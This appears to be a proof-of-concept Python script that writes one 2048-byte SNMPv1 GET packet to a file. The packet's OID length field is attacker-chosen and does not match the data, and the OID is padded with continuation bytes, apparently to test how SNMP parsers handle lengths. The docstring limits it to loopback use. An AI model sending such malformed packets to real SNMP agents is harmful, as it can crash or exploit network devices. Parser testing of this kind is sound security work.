#!/usr/bin/env python3
"""2048-byte SNMPv1 GET with an attacker-chosen OID BER length.

Same natural layout as mkpkt.py: OID value starts at offset 40 with 0x2b
followed by 0x80 continuation bytes through offset 2047. Only the two-byte
declared OID length changes, so the outer BER lengths still describe the real
2048-byte datagram. Loopback provisioning only.
"""
import struct
import sys

TOTAL = 2048


def tlv(tag: int, value: bytes) -> bytes:
    n = len(value)
    if n < 0x80:
        return bytes([tag, n]) + value
    if n <= 0xFFFF:
        return bytes([tag, 0x82]) + struct.pack(">H", n) + value
    raise ValueError(n)


def build(declared: int) -> bytes:
    if not 0x80 <= declared <= 0xFFFF:
        raise ValueError("use 2-byte long-form lengths in [0x80, 0xffff]")
    version = tlv(0x02, b"\x00")
    community = tlv(0x04, b"public")
    oid_value = b"\x2b" + b"\x80" * (TOTAL - 41)
    oid = b"\x06\x82" + struct.pack(">H", declared) + oid_value
    varbind = tlv(0x30, oid)
    varbinds = tlv(0x30, varbind)
    request_body = (
        tlv(0x02, b"\x01")
        + tlv(0x02, b"\x00")
        + tlv(0x02, b"\x00")
        + varbinds
    )
    message = tlv(0x30, version + community + tlv(0xA0, request_body))
    if len(message) != TOTAL:
        raise ValueError(f"datagram {len(message)} != {TOTAL}")
    return message


if __name__ == "__main__":
    declared = int(sys.argv[1], 0)
    data = build(declared)
    with open(sys.argv[2], "wb") as f:
        f.write(data)
    print(f"bytes={len(data)} declared_oid_len={declared} oid_value_offset=40")
